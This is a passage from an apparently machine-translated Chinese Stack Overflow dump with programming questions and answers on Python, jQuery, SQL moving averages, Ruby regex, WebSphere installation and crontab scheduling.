        if a[1]== "Barnaby's" and a[2] =="Wednesday":
            kml.newpoint(name="Barnaby's", coords=[(-75.604049,39.959488)], description=a[5])
            kml.save("pythonmap.kml")
            print "Creating KML" 
```

显然在周三晚上对此进行了测试……至于最后三个 if 语句，无论我将它们按什么顺序排列，它都会为 Iron Hill 和 Barnaby's 创建一个 kml，但不会为侧栏创建一个 kml。这是它返回的结果：

```
Wednesday
Creating KML
Creating KML

Traceback (most recent call last):
  File "C:/Users/75IV740906/Desktop/py117", line 26, in <module>
    if a[1]== "Iron Hill" and a[2] =="Wednesday":
IndexError: list index out of range 
```

错误消息指出 if 语句位于顶部。我难住了。希望我的问题是有道理的（为什么它给我这个错误信息，并且无论 if 语句的顺序如何，都只创建两个 kmls）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:10:42.107

改变

```
times=open("E:\\Python\Copyofresttable.csv","r") 
```

至：

```
times=open("E:\\Python\Copyofresttable.csv","r").read() 
```

在你的第一行并添加一个

```
print('#Times: {0}'.format(len(times.split()))) 
```

以确保您有足够的线路...

**更新**：

您回溯（在评论中）表明您的（第一个？！）`dayoftheweek`似乎是星期三，这就是为什么您的第一个两个 if 被忽略的原因。然后，您的列表`a`似乎没有足够的条目。

您可以使用`print("# a: {0}".format(len(a)))`

因此，如果您的条目少于 3 个，则`a[2]==`必须失败，因为`list index out of range`;-)

啊，我一开始没有正确阅读你的问题。这样更有意义，如果每个第一个 if 语句都抛出异常......

**更新 2：** 顺便说一句：您应该将`for line in times:`循环重新排列为较少冗余的方式，例如：

```
lines=open("E:\\Python\Copyofresttable.csv","r").readlines()
...
for line in lines:
    a = line.split(',')
    if a[2] == "Monday" == dayoftheweek:
        ...
    elif a[2] == "Tuesday" == dayoftheweek:
        ...
    elif a[1]== "Iron Hill" and a[2] =="Wednesday" == dayoftheweek:
        ... 
```

**更新 3：**

如果省略某些行，您可以通过执行以下操作“欺骗”一点：

```
a = line.split(',')
if len(a) < 6:
   continue   # ignores the rest of the loop and jumps stright to the next iteration 
```

# python - 在 python 中使用 lxml 解析嵌套的 html 列表

> ID：13280660
> 
> 赞同：2
> 
> 时间：2012-11-08T00:29:04.553
> 
> 标签：python, string, lxml

我正在尝试解析看起来像这样的 html 列表的元素：

```
<ol>
    <li>r1</li>
    <li>r2
        <ul>
            <li>n1</li>
            <li>n2</li>
        </ul>
    </li>
    <li>r3
        <ul>
            <li>d1
                <ol>
                    <li>e1</li>
                    <li>e2</li>
                </ol>
            </li>
            <li>d2</li>
        </ul>
    </li>
    <li>r4</li>
</ol> 
```

在大多数情况下，我可以很好地解析它，但对我来说最大的问题是取回 dom 文本。不幸的是，lxml 的 node.text_content() 返回它下面的完整树的文本形式。我可以使用 lxml 获取该元素的文本内容，还是需要为此使用字符串操作或正则表达式？

例如：具有 d1 的节点返回“d1e1e2”，而我希望它只返回 d1。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:57:07.443

每个节点都有一个名为 的属性`text`。这就是你要找的。

例如：

```
for node in root.iter("*"):
    print node.text
    # print node.tail # e.g.: <div> <span> abc </span> def </div> => abc def 
```

# javascript - 如果有兄弟姐妹，则 jquery 兄弟姐妹（）似乎包括选择器，但如果没有，则不包括

> ID：13280664
> 
> 赞同：-1
> 
> 时间：2012-11-08T00:29:39.270
> 
> 标签：javascript, jquery, html, ajax, django-templates

我有一个带有以下成功函数的 ajax 调用：

```
 success: function(response){
                console.log($(response).siblings());
                $(response).siblings().each(function(){
                    alert("foo");
                    var thing_id = $(this).attr("id").split("-")[0];
                    alert(thing_id);
                    $("#"+thing_id).append(this);
                }) 
```

使用这个 django 模板（稍微匿名）呈现响应的地方：

```
{% for thing in things %}
    <div id="{{ thing.something.id }}-pc">
        <div>
            <span class="tablename">Something Else</span>
            {% include '<some template>' with table=thing.something_else %}
        </div>

    </div>
{% endfor %} 
```

兄弟（）的文档声明不包括选择器，如果我`thing in things`的模板中只有一个，我会看到这一点，但如果我有多个，我会在循环中收到两个顶级 div 警报。

这是怎么回事？！

编辑（更好的问题）：为什么我在有 2 个时得到两个顶级 div，但当我调用时只有 1 个时得到`siblings()`0 `$(response)`？

好像我误解了我选择的内容`$(response)`。谁能澄清一下？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:52:54.937

> *“那我说的时候选择什么* `$(response)`？”

这为您提供了一个包含字符串中*所有*顶级元素的 jQuery 对象。`response`如果有，比如说，三个顶级元素，那么`$(response).length`将是`3`.

`$(response).siblings()`然后为您提供所有顶级元素的所有兄弟，并且因为每个都是其他元素的兄弟，所以这再次返回所有顶级元素。

如果只有一个顶级元素，则它没有兄弟姐妹。

所以显然`.siblings()`在这里使用的方法是错误的，但我不确定建议您改用什么方法，因为您想要的结果仍然不清楚。

您可以使用以下命令遍历每个顶级元素：

```
$(response).each(function() {... 
```

要获得一个特定的，您可以使用`.eq(someZeroBasedIndex)`，例如，`$(response).eq(1)`获得第二个。

要获得除第一个之外的所有内容，您可以使用`$(response).slice(1)`.

# android - 如何从android中的缓存中检索图像

> ID：13280667
> 
> 赞同：0
> 
> 时间：2012-11-08T00:30:02.640
> 
> 标签：android

这是代码片段：

```
private static Drawable getDrawableFromUrl(final String url) throws IOException, MalformedURLException {
        URL uurl = new URL(url);
        URLConnection connection = uurl.openConnection();
        connection.setUseCaches(true);  //share cache with browser
        Object response = connection.getContent();
        return Drawable.createFromStream(((InputStream)response), uurl.getFile());
    } 
```

那么现在我如何在下次和后续时间从缓存中检索它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:33:44.227

`setUseCaches`并不意味着位图缓存在某处......它只是控制此连接是否允许使用缓存。

如果您想为位图使用缓存，我强烈建议您使用[wasp](https://github.com/telly/wasp)库。

# mysql - 如何在 SQL 中对一系列日期进行移动平均？

> ID：13280677
> 
> 赞同：6
> 
> 时间：2012-11-08T00:31:32.003
> 
> 标签：mysql, sql, postgresql

假设我有两列，DATE 和 VALUE。日期不一定是有规律的间隔。如何在过去 N 天内创建 VALUE 的移动平均线？我正在使用 postgres，但 mysql 解决方案也会有所帮助。

数据：

```
DATE    VALUE
2012-11-05 10
2012-10-29 31
2012-10-22 108
2012-10-17 3654
2012-10-16 1187
2012-10-15 12033
2012-10-09 41
2012-10-01 85
2012-09-25 20
2012-09-24 285
2012-09-17 20
2012-09-10 20
2012-09-04 41
2012-08-27 63
2012-08-20 52
2012-08-13 160 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-08T00:51:11.753

下面的 MySQL 示例涵盖了一个滑动的 7 天窗口：

```
select t1.`DATE`, AVG(t2.`VALUE`) as MV_AVG
from MyTable t1
left outer join MyTable t2 
    on t2.`DATE` between DATE_ADD(t1.`DATE`, INTERVAL -6 DAY) 
        and t1.`DATE`
group by t1.`DATE` 
```

[SQL 小提琴示例](http://sqlfiddle.com/#!2/8d659/4)

**输出：**

```
|                             DATE |    MV_AVG |
------------------------------------------------
|    August, 12 2012 20:00:00+0000 |       160 |
|    August, 19 2012 20:00:00+0000 |        52 |
|    August, 26 2012 20:00:00+0000 |        63 |
| September, 03 2012 20:00:00+0000 |        41 |
| September, 09 2012 20:00:00+0000 |      30.5 |
| September, 16 2012 20:00:00+0000 |        20 |
| September, 23 2012 20:00:00+0000 |       285 |
| September, 24 2012 20:00:00+0000 |     152.5 |
| September, 30 2012 20:00:00+0000 |      52.5 |
|   October, 08 2012 20:00:00+0000 |        41 |
|   October, 14 2012 20:00:00+0000 |      6037 |
|   October, 15 2012 20:00:00+0000 |      6610 |
|   October, 16 2012 20:00:00+0000 | 5624.6667 |
|   October, 21 2012 20:00:00+0000 | 1649.6667 |
|   October, 28 2012 20:00:00+0000 |        31 |
|  November, 04 2012 19:00:00+0000 |        10 | 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-08T01:10:58.977

RedFilter 的优秀[答案](https://stackoverflow.com/a/13280831/1432614)使用非均匀间隔的桶。如果您想要均匀间隔的桶，请执行以下操作：

```
SELECT
DATE_FORMAT(CURDATE() - INTERVAL ((i.id - 0) * 7) - 1 DAY, '%Y-%m-%d') AS start,
DATE_FORMAT(CURDATE() - INTERVAL ((i.id - 1) * 7) DAY, '%Y-%m-%d') AS end,
AVG(d.value) average
FROM
ids i
LEFT OUTER JOIN
dates d ON
d.date BETWEEN 
  (CURDATE() - INTERVAL ((i.id - 0) * 7) - 1 DAY) AND
  (CURDATE() - INTERVAL ((i.id - 1) * 7) DAY)
WHERE
i.id BETWEEN 0 AND 20
GROUP BY
1
ORDER BY
1 DESC; 
```

它提供了这个：

```
+------------+------------+-----------+
| start      | end        | average   |
+------------+------------+-----------+
| 2012-11-01 | 2012-11-07 |   10.0000 |
| 2012-10-25 | 2012-10-31 |   31.0000 |
| 2012-10-18 | 2012-10-24 |  108.0000 |
| 2012-10-11 | 2012-10-17 | 5624.6667 |
| 2012-10-04 | 2012-10-10 |   41.0000 |
| 2012-09-27 | 2012-10-03 |   85.0000 |
| 2012-09-20 | 2012-09-26 |  152.5000 |
| 2012-09-13 | 2012-09-19 |   20.0000 |
| 2012-09-06 | 2012-09-12 |   20.0000 |
| 2012-08-30 | 2012-09-05 |   41.0000 |
| 2012-08-23 | 2012-08-29 |   63.0000 |
| 2012-08-16 | 2012-08-22 |   52.0000 |
| 2012-08-09 | 2012-08-15 |  160.0000 |
| 2012-08-02 | 2012-08-08 |      NULL |
| 2012-07-26 | 2012-08-01 |      NULL |
| 2012-07-19 | 2012-07-25 |      NULL |
| 2012-07-12 | 2012-07-18 |      NULL |
| 2012-07-05 | 2012-07-11 |      NULL |
| 2012-06-28 | 2012-07-04 |      NULL |
| 2012-06-21 | 2012-06-27 |      NULL |
+------------+------------+-----------+
20 rows in set (0.00 sec) 
```

有关没有 CURDATE() 的工作示例，请参阅[http://sqlfiddle.com/#!2/78c52/39](http://sqlfiddle.com/#!2/78c52/39)。

# python - 将 self.__class__ 设置为其他东西有多危险？

> ID：13280680
> 
> 赞同：35
> 
> 时间：2012-11-08T00:31:33.993
> 
> 标签：python, python-3.x, python-2.x

假设我有一个类，它有许多子类。

我可以实例化类。然后我可以将其`__class__`属性设置为子类之一。我已经有效地将类类型更改为其子类的类型，在一个活动对象上。我可以在其上调用调用这些方法的子类版本的方法。

那么，这样做有多危险呢？看起来很奇怪，但这样做有*错*吗？尽管能够在运行时更改类型，但这是应该完全避免的语言特性吗？为什么或者为什么不？

（根据回复，我将发布一个更具体的问题，关于我想做什么，以及是否有更好的选择）。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-11-08T00:46:12.683

以下是我能想到的导致这种危险的事情的清单，从最坏到最不坏的粗略顺序：

*   阅读或调试代码的人可能会感到困惑。
*   您不会得到正确的`__init__`方法，因此您可能不会正确初始化所有实例变量（甚至根本不会）。
*   2.x 和 3.x 之间的差异非常显着，以至于移植起来可能会很痛苦。
*   有一些带有类方法、手动编码的描述符、方法解析顺序的挂钩等的极端情况，它们在经典类和新式类之间是不同的（同样，在 2.x 和 3.x 之间）。
*   如果使用`__slots__`，则所有类必须具有相同的插槽。（如果你有兼容但不同的插槽，它可能一开始似乎可以工作，但会做一些可怕的事情......）
*   新式类中的特殊方法定义可能不会改变。（事实上​​，这在所有当前的 Python 实现中都可以使用，但是没有*文档证明*可以使用，所以……）
*   如果您使用`__new__`，事情将不会按照您天真预期的方式进行。
*   如果这些类有不同的元类，事情会变得更加混乱。

同时，在您认为有必要这样做的许多情况下，还有更好的选择：

*   使用工厂动态创建适当类的实例，而不是创建基实例然后将其转换为派生实例。
*   使用`__new__`或其他机制来钩住结构。
*   重新设计事物，使您拥有一个具有某些数据驱动行为的类，而不是滥用继承。

作为最后一个最常见的特定情况，只需将所有“变量方法”放入其实例作为“父”的数据成员保存的类中，而不是放入子类中。与其改变`self.__class__ = OtherSubclass`，不如去做`self.member = OtherSubclass(self)`。如果您真的需要神奇地改变方法，那么自动转发（例如 via `__getattr__`）是一种比动态更改类更常见和 Python 的习惯用法。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-11-08T01:28:04.567

`__class__`如果您有一个长时间运行的应用程序并且您需要在不丢失数据的情况下用同一类的较新版本替换某个对象的旧版本，例如在某些`reload(mymodule)`未重新加载未更改的模块之后，分配该属性很有用。另一个例子是如果你实现持久性 - 类似于`pickle.load`.

不鼓励所有其他用法，特别是如果您可以在启动应用程序之前编写完整的代码。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-08T01:14:25.050

在任意类上，这极不可能起作用，即使它起作用也非常脆弱。这与将底层函数对象从一个类的方法中提取出来，然后在不是原始类实例的对象上调用它们基本上是一回事。这是否可行取决于内部实现细节，并且是一种*非常*紧密的耦合形式。

也就是说，`__class__`在一组**专门设计**为以这种方式使用的类中更改对象可能非常好。很长一段时间以来，我都知道您可以做到这一点，但我还没有发现这种技术的用途，即没有同时想到更好的解决方案。因此，如果您认为自己有用例，那就去做吧。请在您的评论/文档中明确发生了什么。特别是这意味着所有涉及的类的实现必须尊重它们的*所有*不变量/假设/等，而不是能够孤立地考虑每个类，所以你要确保任何从事任何工作的人所涉及的代码都知道这一点！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-06-28T04:42:32.003

好吧，不要忽视一开始就警告过的问题。但在某些情况下它可能很有用。

首先，我查找这篇文章的原因是因为我只是这样做并且`__slots__`不喜欢它。（是的，我的代码是插槽的有效用例，这是纯粹的内存优化），我试图解决插槽问题。

我首先在 Alex Martelli 的 Python Cookbook（第 1 版）中看到了这一点。在第 3 版中，它是 8.19 节“实现有状态对象或状态机问题”。一个知识渊博的来源，Python 明智的。

假设您有一个 ActiveEnemy 对象，该对象的行为与 InactiveEnemy 不同，并且您需要在它们之间快速来回切换。甚至可能是死敌。

如果 InactiveEnemy 是子类或兄弟，您可以切换类属性。更准确地说，确切的祖先比与调用它的代码一致的方法和属性更重要。想想 Java**接口**，或者正如一些人提到的，你的类需要在设计时考虑到这种用途。

现在，您仍然需要管理状态转换规则和各种其他事情。而且，是的，如果您的客户端代码不期望这种行为并且您的实例切换行为，那么事情将会很受欢迎。

但是我已经在 Python 2.x 上非常成功地使用了它，并且从来没有遇到过任何不寻常的问题。最好在具有相同方法签名的子类上使用共同的父级和小的行为差异。

没问题，直到我`__slots__`的问题刚刚阻止它。但是插槽一般来说是一种痛苦。

我不会这样做来修补实时代码。我也会使用工厂方法来**创建**实例。

但是要管理预先知道的非常具体的条件？就像期望客户彻底理解的状态机一样？然后它非常接近魔法，伴随着所有的风险。它相当优雅。

Python 3 问题？测试它是否有效，但 Cookbook 在其示例 FWIW 中使用 Python 3 print(x) 语法。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-05-15T21:37:14.657

其他答案很好地讨论了为什么仅仅改变`__class__`可能不是最佳决定的问题。

下面是一种避免`__class__`在创建实例后更改的方法示例，使用`__new__`. 为了完整起见，我不推荐它，只是展示它是*如何*完成的。然而，最好使用一个无聊的旧工厂来做到这一点，而不是把鞋拔继承到一个不打算做的工作中。

```
class ChildDispatcher:
    _subclasses = dict()
    def __new__(cls, *args, dispatch_arg, **kwargs):
        # dispatch to a registered child class
        subcls = cls.getsubcls(dispatch_arg)
        return super(ChildDispatcher, subcls).__new__(subcls)
    def __init_subclass__(subcls, **kwargs):
        super(ChildDispatcher, subcls).__init_subclass__(**kwargs)
        # add __new__ contructor to child class based on default first dispatch argument
        def __new__(cls, *args, dispatch_arg = subcls.__qualname__, **kwargs):
            return super(ChildDispatcher,cls).__new__(cls, *args, **kwargs)
        subcls.__new__ = __new__
        ChildDispatcher.register_subclass(subcls)

    @classmethod
    def getsubcls(cls, key):
        name = cls.__qualname__
        if cls is not ChildDispatcher:
            raise AttributeError(f"type object {name!r} has no attribute 'getsubcls'")
        try:
            return ChildDispatcher._subclasses[key]
        except KeyError:
            raise KeyError(f"No child class key {key!r} in the "
                           f"{cls.__qualname__} subclasses registry")

    @classmethod
    def register_subclass(cls, subcls):
        name = subcls.__qualname__
        if cls is not ChildDispatcher:
            raise AttributeError(f"type object {name!r} has no attribute "
                                 f"'register_subclass'")
        if name not in ChildDispatcher._subclasses:
            ChildDispatcher._subclasses[name] = subcls
        else:
            raise KeyError(f"{name} subclass already exists")

class Child(ChildDispatcher): pass

c1 = ChildDispatcher(dispatch_arg = "Child")
assert isinstance(c1, Child)
c2 = Child()
assert isinstance(c2, Child) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-08T00:46:03.857

它有多“危险”主要取决于子类在初始化对象时会做什么。它完全有可能无法正确初始化，只运行基类的`__init__()`，并且稍后会因为未初始化的实例属性而失败。

即使没有这个，对于大多数用例来说，这似乎也是一种不好的做法。更容易首先实例化所需的类。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-11-08T01:15:07.467

这是一个示例，您可以在不更改`__class__`. 在对问题的评论中引用@unutbu：

> 假设您正在建模元胞自动机。假设每个单元格可能处于 5 个阶段之一。您可以定义 5 个类 Stage1、Stage2 等。假设每个 Stage 类都有多个方法。

```
class Stage1(object):
  …

class Stage2(object):
  …

…

class Cell(object):
  def __init__(self):
    self.current_stage = Stage1()
  def goToStage2(self):
    self.current_stage = Stage2()
  def __getattr__(self, attr):
    return getattr(self.current_stage, attr) 
```

> 如果您允许更改`__class__`，您可以立即为单元格提供新阶段的所有方法（名称相同，但行为不同）。

改变也是一样`current_stage`，但这是一个完全正常和 pythonic 的事情，不会混淆任何人。

另外，它允许您*不*更改某些您不想更改的特殊方法，只需在`Cell`.

另外，它适用于数据成员、类方法、静态方法等，每个中级 Python 程序员都已经理解。

> 如果您拒绝更改`__class__`，那么您可能必须包含一个阶段属性，并使用大量 if 语句，或者重新分配许多指向不同阶段功能的属性

是的，我使用了 stage 属性，但这不是缺点——它是跟踪当前 stage 是什么的明显可见的方式，更利于调试和可读性。

除了 stage 属性之外，没有一个 if 语句或任何属性重新分配。

这只是在不改变的情况下执行此操作的多种不同方式之一`__class__`。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2012-11-08T02:40:13.007

在评论中，我建议将元胞自动机建模为动态`__class__`s 的可能用例。让我们试着充实一下这个想法：

* * *

**使用动态`__class__`**：

```
class Stage(object):
    def __init__(self, x, y):
        self.x = x
        self.y = y

class Stage1(Stage):
    def step(self):
        if ...:
            self.__class__ = Stage2

class Stage2(Stage):
    def step(self):
        if ...:
            self.__class__ = Stage3

cells = [Stage1(x,y) for x in range(rows) for y in range(cols)]

def step(cells):
    for cell in cells:
        cell.step()
    yield cells 
```

* * *

由于缺乏更好的术语，我将称之为

**传统方式：（**主要是abarnert的代码）

```
class Stage1(object):
    def step(self, cell):
        ...
        if ...:
            cell.goToStage2()

class Stage2(object):
    def step(self, cell):
        ...
        if ...:        
            cell.goToStage3()

class Cell(object):
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.current_stage = Stage1()
    def goToStage2(self):
        self.current_stage = Stage2()
    def __getattr__(self, attr):
        return getattr(self.current_stage, attr)

cells = [Cell(x,y) for x in range(rows) for y in range(cols)]

def step(cells):
    for cell in cells:
        cell.step(cell)
    yield cells 
```

* * *

**比较：**

*   传统方式创建一个实例列表，`Cell`每个实例都具有当前阶段属性。

    动态`__class__`方式创建一个实例列表，这些实例是`Stage`. 不需要当前阶段属性，因为`__class__`已经用于此目的。

*   传统方式使用`goToStage2`, `goToStage3`, ... 方法来切换阶段。

    动态`__class__`方式不需要这样的方法。您只需重新分配`__class__`.

*   传统方式使用特殊方法`__getattr__`将一些方法调用委托给 `self.current_stage`属性中保存的适当阶段实例。

    动态`__class__`方式不需要任何此类委托。中的实例`cells`已经是您想要的对象。

*   传统方式需要将`cell`作为参数传递给 `Stage.step`. 这才`cell.goToStageN`叫得上。

    动态`__class__`方式不需要传递任何东西。我们正在处理的对象拥有我们需要的一切。

* * *

**结论：**

两种方式都可以工作。就我所能想象的这两种实现将如何发展而言，在我看来，动态`__class__`实现将是

*   更简单（无`Cell`类），

*   更优雅（没有丑陋`goToStage2`的方法，没有脑筋急转弯，比如为什么你需要写`cell.step(cell)`而不是`cell.step()`），

*   并且更容易理解（不`__getattr__`，没有额外的间接级别）

# ruby-on-rails - Feature/Scenerio 是 Describe/It 的替代品吗？

> ID：13280684
> 
> 赞同：0
> 
> 时间：2012-11-08T00:32:20.047
> 
> 标签：ruby-on-rails, capybara, rspec-rails

我一直在关注[Ruby on Rails 教程](http://ruby.railstutorial.org/)。作者在整个教程中使用**Rspec/Capybara**。`Describe/It`但最近我看到人们使用它`Feature/Scenerio`。我想知道是否`Feature/Scenerio`是替代品`Describe/It`或一起使用的东西？如果是替代品，有什么理由更喜欢它`Describe/It`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T08:43:05.290

最近我也遇到了同样的问题。我去了[Capybara 的 github 页面](https://github.com/jnicklas/capybara)阅读更多相关信息（搜索*场景*）。显然*feature*、*scenario*和*background*只是使验收测试更具可读性的别名。我猜这是出于遗留原因——黄瓜使用这些关键字。因此，通过给它们起别名，capybara 接受规范读起来更像是传统的黄瓜规范。

所以不，功能/场景/背景不是描述/它/之前的替代品。作为一组方法，它**只是验收规范的替代方案**。由您和您的团队决定与哪些人一起使用。

# ruby - ruby 查找和替换字符串的一部分

> ID：13280686
> 
> 赞同：0
> 
> 时间：2012-11-08T00:32:26.287
> 
> 标签：ruby, regex

我在 ruby​​ 变量中有一个大文件，它遵循如下常见模式：

```
// ...

// comment
$myuser['bla'] = 'bla';

// comment
$myuser['bla2'] = 'bla2';

// ... 
```

我试图给一个'键'替换'值'

这替换了整个字符串我该如何修复它？我认为的另一种方法是分两步完成，第一步是在引号内找到值然后执行字符串替换，什么是最好的？

```
def keyvalr(content, key, value)
    return content.gsub(/\$bla\[\'#{key}\'\]\s+\=\s+\'(.*)\'/) {|m| value }
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:34:01.857

是贪婪的`.*`并且尽可能多地消耗（直到最后一个`'`）。使那`.`a`[^']`那么它不可能超过第一个 close `'`。

```
/(\$bla\[\'#{key}\'\]\s+\=\s+\')[^']*(\')/ 
```

我还添加了括号来捕获除要替换的值之外的所有内容。第一组括号将对应于`\1`，第二组将对应于`\2`。这样您就可以将其匹配替换为：

```
"\1yournewvaluehere\2" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:10:42.417

我会使用类似的东西：

```
text = %q{
// ...

// comment
$myuser['bla'] = 'bla';

// comment
$myuser['bla2'] = 'bla2';

// ...
}

from_to = {
  'bla'  => 'foo',
  'bla2' => 'bar'
}

puts text.gsub(/\['([^']+)'\] = '([^']+)'/) { |t|
  key, val = t.scan(/'([^']+)'/).flatten
  "['%s'] = '%s'" % [ key, from_to[key] ]
} 
```

哪个输出：

```
// ...

// comment
$myuser['bla'] = 'foo';

// comment
$myuser['bla2'] = 'bar';

// ... 
```

这是它的工作原理：

如果我做：

```
puts text.gsub(/\['([^']+)'\] = '([^']+)'/) { |t|
  puts t
} 
```

我懂了：

```
['bla'] = 'bla'
['bla2'] = 'bla2' 
```

然后我尝试了：

```
"['bla'] = 'bla'".scan(/'([^']+)'/).flatten
=> ["bla", "bla"] 
```

这给了我一个键，“值”对，所以我可以使用散列来查找替换值。

将它放在一个`gsub`块内意味着匹配的任何内容都被我的块返回值替换，所以我创建了一个字符串来替换“命中”并让它`gsub`做它的“thang”。

我不太相信使用长正则表达式。我不得不维护太多试图使用复杂模式的代码，并且出现了一些错误，并且未能在 100% 的时间内完成预期的任务。它们非常强大，但代码的维护比开发它更难/更糟糕，所以我尝试将我编写的模式保持在勺子大小的块中，对那些跟随我维护代码的人怜悯。

# websphere - 安装 Websphere Application Server 网络部署的步骤

> ID：13280687
> 
> 赞同：4
> 
> 时间：2012-11-08T00:32:50.563
> 
> 标签：websphere, websphere-8

我已将 Websphere Application Server Network Deployment 试用版下载为 http 下载，分为 3 个部分。解压缩这些文件后，我对它的安装一无所知。
在 Windows 7 64 位机器上安装它的步骤是什么？如果有任何解释这些步骤的链接，请告诉我。我厌倦了谷歌搜索，但找不到任何关于安装步骤的清晰解释。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T01:55:58.290

从 WAS 8.0 开始，WAS 与另一个名为[IBM Installation Manager](http://pic.dhe.ibm.com/infocenter/wasinfo/v8r0/topic/com.ibm.websphere.installation.nd.doc/info/ae/ae/welc_newinstaller.html)的程序一起安装。您下载的三个文件统称为 WAS ND“存储库”。高级步骤如下。

1.  下载 WAS ND（您已完成此操作）。
2.  解压这三个文件，创建disk1、disk2等。这是您的存储库。
3.  下载即时消息。
4.  安装即时消息。
5.  运行即时消息。
6.  将您的 WAS ND 存储库添加到 IM 的存储库集中。
7.  安装ND。

您可以重新使用 IM 来应用修订包、安装其他 WebSphere 相关产品以及删除这些产品。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-15T03:45:29.530

产品文档（信息中心）将告诉您如何安装它。- [http://pic.dhe.ibm.com/infocenter/wasinfo/v8r5/topic/com.ibm.websphere.nd.multiplatform.doc/ae/welc6productov.html](http://pic.dhe.ibm.com/infocenter/wasinfo/v8r5/topic/com.ibm.websphere.nd.multiplatform.doc/ae/welc6productov.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-10-17T16:16:55.807

虽然它是一个旧线程，但有时 IM 会给安装修复包带来很多麻烦。因此，这是一个使用命令行的替代解决方案，非常简单且切中要害

*   下载修订包 [例如：part1、part2]。
*   将包提取到单个文件夹**fix_packXX**中。
*   通过在 CMD 中运行以下命令，转到`<%WEBSHERE_HOME%>/AppServer/bin`并检查 WAS 的版本详细信息：

```
versionInfo.bat 
```

*   标记以下细节[特别是WAS的**包]：**

```
Build Date            5/14/13
Package               com.ibm.websphere.DEVELOPERS.v85_8.5.5000.20130514_1044 
```

*   去

```
Windows: C:\Program Files\IBM\Installation Manager\eclipse\tools
Linux: opt/IBM/InstallationManager/eclipse/tools/ 
```

*   在 CMD/BASH 中运行以下命令 [根据您的路径更改目录]：

```
Windows: imcl listAvailablePackages -repositories "C:/fix_packXX/repository.config"
Linux: ./imcl listAvailablePackages -repositories /fix_packXX/repository.config 
```

*   通过检查我们在上述步骤中记录的类型来选择合适的**包**[例如：在这种情况下为 DEVELOPERS] 进行安装。**使用新包**运行以下命令并完成包安装

```
imcl install com.ibm.websphere.DEVELOPERS.v85_8.5.5012.20170627_1018 -repositories "C:/fix_packXX/repository.config" -installationDirectory "<%WEBSHERE_HOME%>/AppServer" -acceptLicense -sP 
```

*   完毕。

希望对正在使用 IBM Installation Manager 的人有所帮助。

# macos - crontab 没有运行我的脚本

> ID：13280699
> 
> 赞同：11
> 
> 时间：2012-11-08T00:34:13.743
> 
> 标签：macos, unix, crontab

我是 cron 工作的新手。我读了一篇关于如何使用 crontab 编写 cron 作业的[帖子。](http://broadcasterproject.wordpress.com/)所以我的 crontab 看起来像这样：

`1 * * * * /Users/apple/Desktop/wget/down.sh`

这基本上意味着每分钟我都想执行脚本：*down.sh*。现在脚本手动运行良好。该脚本是一个从 Internet 下载 PDF 的简单程序：

`#!/bin/bash`

`wget -U Mozilla -t 1 -nd -A pdf "http://www.fi.usj.edu.lb/images/stories/HoraireS08/3eli.pdf" -e robots=off;`

一旦终端告诉我他正在安装新的 crontab，我不知道为什么它不是每分钟都运行。

有人可以帮我吗？

解决方案：谢谢大家的帮助，如果你希望它每小时执行一次， **mcalex所说的语法应该是 * */1 * * * path/to/script。**cron作业正常工作。但是我的错误只是写权限，实际上在执行wget命令时，它应该在当前workind目录中写入pdf文件，该目录是cron选项卡的系统目录。所以我只需在执行 wget 命令之前导航到桌面目录即可解决我的问题，如下所示：

`cd /Users/apple/Desktop/wget`

然后做任何我想做的事。PS：我也应该包含 wget 命令的完整路径。

再次感谢大家的帮助：）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-08T08:56:25.340

当您将 1 放入第一列时，它将在第一分钟（每小时）运行。为了让它在每小时的每一分钟内运行，您需要将分钟列设置为 */1

所以你的行应该是：

```
*/1 * * * * /Users/apple/Desktop/wget/down.sh 
```

支持链接： 每分钟作业： [https](https://bbs.archlinux.org/viewtopic.php?id=59180)
://bbs.archlinux.org/viewtopic.php?id= 59180 每 5 分钟作业： [http ://www.thegeekstuff.com/2011/07/cron-every-5-minutes /](http://www.thegeekstuff.com/2011/07/cron-every-5-minutes/)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-08T06:05:37.280

1 * * * * /Users/apple/Destop/wget/down.sh

从这个条目开始，脚本永远不会每分钟运行一次，因为它会在每小时的第一分钟运行。

对您的 crontab 文件进行此更改，以每分钟运行一次此脚本。

“* * * * * /Users/apple/Destop/wget/down.sh”

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-08T00:45:31.357

你有错字吗？看起来您可能输错了桌面？

另一件事是将运行脚本的输出重定向到一个文件，这样你就可以看到发生了什么：

1 * * * * /Users/apple/Destop/wget/down.sh >> /tmp/cron.out

然后检查文件以查看发生了什么。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-08-29T16:38:48.233

如果您的 cronjob 正在将内容写入磁盘，请注意未选中系统首选项“尽可能让硬盘进入睡眠状态”。

这阻止了我的 cronjob 备份任务执行。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-08T00:53:27.960

*   cron 是否向您发送了一些电子邮件，详细说明出了什么问题？
*   该路径下的脚本是否存在？
*   请注意，cron 用于`/bin/sh`执行命令。
*   `PATH`您是否在脚本中设置了正确的？`wget`可能不是默认值`PATH`，也可能根本没有`PATH`。尝试`/path/to/wget`在脚本中使用。

